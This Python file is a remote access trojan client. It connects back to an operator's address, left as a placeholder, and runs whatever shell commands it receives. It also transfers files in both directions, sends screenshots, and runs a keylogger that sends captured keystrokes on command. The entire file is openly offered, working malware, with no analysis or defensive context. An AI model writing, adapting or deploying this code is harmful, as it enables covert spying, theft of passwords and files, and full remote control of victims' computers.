import socket, time, subprocess, json, os, getpass, pynput
from pynput import keyboard
from PIL import ImageGrab

def main() :
    def reliable_send(data):
            print("reached send")
            print(data)
            jsondata = json.dumps(data)
            print(data)
            s.send(jsondata.encode())

    def reliable_recv():
            data = ''
            while True:
                    try:
                            data = data + s.recv(1024).decode().rstrip()
                            return json.loads(data)
                    except ValueError:
                            continue
   
    
    def keys(stop) :
            
            def on_press(key) :
                
                record.append(key)
                print(record)
                

            if stop == 0 :
                print("stop = 0 assign new var and listener")
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                global record
                record = []
                
            if stop == 1 :
                print("convert to string i think")
                print(record)
                stringrecord = ''.join(str(record))
                stringrecord = stringrecord.strip("[]")
                reliable_send(stringrecord)
                listener.stop()
                record = []
            
                
                    
        

    def screenshot() :

        im = ImageGrab.grab()
        user = getpass.getuser()
        im.save(f"C:/Users/"+ str(user)+"/img.png")
        f = open("C:/Users/"+ str(user)+"/img.png", 'rb')
        s.send(f.read())
        f.close()
        os.remove(f"C:/Users/"+ str(user)+"/img.png")
    def connection():
        while True:
            time.sleep(5)
            try:
                s.connect((ENTER YOUR IP ADDRESS HERE, ENTER YOUR PORT HERE))
                shell()
                s.close()
                break
            except:
                connection()

    def upload_file(file_name):
        f = open(file_name, 'rb')
        s.send(f.read())


    def download_file(file_name):
            f = open(file_name, 'wb')
            s.settimeout(5)
            chunk = s.recv(1024)
            while chunk:
                    f.write(chunk)
                    try:
                            chunk = s.recv(1024)
                    except socket.timeout as e:
                            break
            s.settimeout(None)
            f.close()


    def shell():

        while True:
            command = reliable_recv()
            if command == 'quit':
                break
            elif command == 'clear':
                pass
            elif command[:3] == 'cd ':
                os.chdir(command[3:])
            elif command[:8] == 'download':
                upload_file(command[9:])
            elif command[:6] == 'upload':
                download_file(command[7:])
            elif command == 'screenshot':
                screenshot()
            elif command == 'keys':
                keys(0)
            elif command == 'keys_stop':
                keys(1)
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection()
main()


